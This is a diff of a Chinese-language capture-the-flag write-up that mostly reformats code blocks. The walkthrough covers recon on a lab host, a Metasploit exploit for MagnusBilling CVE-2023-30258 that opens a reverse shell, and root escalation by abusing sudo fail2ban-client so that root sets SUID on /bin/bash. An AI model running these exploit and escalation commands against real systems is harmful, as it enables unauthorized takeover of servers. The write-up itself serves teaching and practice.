@@ -22,14 +22,15 @@ nmap -sV -T4 -sC 10.144.148.138 -Pn
 80/tcp  open  http  Apache httpd 2.4.62 (Debian)
 
 访问 http://10.144.148.138 后自动跳转到 /mbilling/ 目录。
-Web 目录爆破
-Bashgobuster dir -u http://10.144.148.138/mbilling -w /usr/share/seclists/Discovery/Web-Content/common.txt -q
-发现关键目录：
 
+Web 目录爆破
+```Bash
+gobuster dir -u http://10.144.148.138/mbilling -w /usr/share/seclists/Discovery/Web-Content/common.txt -q
+```
+发现关键目录：
 /mbilling/
 
-关键发现
-
+关键发现:
 页面为 MagnusBilling（VoIP 计费系统）
 通过查看网页源代码确认版本信息
 使用 searchsploit 搜索发现 CVE-2023-30258（MagnusBilling unauthenticated Command Injection）
@@ -40,30 +41,37 @@ Bashgobuster dir -u http://10.144.148.138/mbilling -w /usr/share/seclists/Discov
 CVE：CVE-2023-30258
 利用方式
 使用 Metasploit 直接打：
-Bashmsfconsole
+```Bash
+msfconsole
 use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
 set RHOSTS 10.144.148.138
 set LHOST <你的Kali IP>
 exploit
+```
 成功获得 www-data 权限的 reverse shell。
 
 ## 3. 权限提升 (Privilege Escalation)
 枚举 sudo 权限
 Bashsudo -l
 关键发现：
-text(ALL) NOPASSWD: /usr/bin/fail2ban-client
+```text
+(ALL) NOPASSWD: /usr/bin/fail2ban-client
+```
 提权利用（Fail2Ban Sudo 提权）
 Fail2Ban 以 root 权限运行，我们通过 fail2ban-client 修改 actionban 来让 root 执行任意命令。
 完整提权命令：
 ###  添加自定义 action
+```Bash
 sudo /usr/bin/fail2ban-client set sshd addaction evil
-
+```
 ###  修改 actionban 为我们想要执行的命令
+```Bash
 sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
-
+```
 ###  触发 banip，让 root 执行上面的命令
+```Bash
 sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5
-
+```
 ###  使用带 SUID 的 bash 获得 root shell
 /bin/bash -p
 最终权限：root
@@ -84,7 +92,7 @@ actionban 参数会被 root 直接执行。
 经典利用方式：修改 actionban 为 chmod +s /bin/bash → 触发 banip → 使用 /bin/bash -p 提权。
 
 GTFOBins 技巧
-fail2ban-client 在 GTFOBins 中有明确的 sudo 提权方法（a）和（b），我们使用的是最简单的 (a) 方法。
+fail2ban-client 在 GTFOBins 中有明确的 sudo 提权方法（a）和（b），我使用的是最简单的 (a) 方法。
 
 ---
 
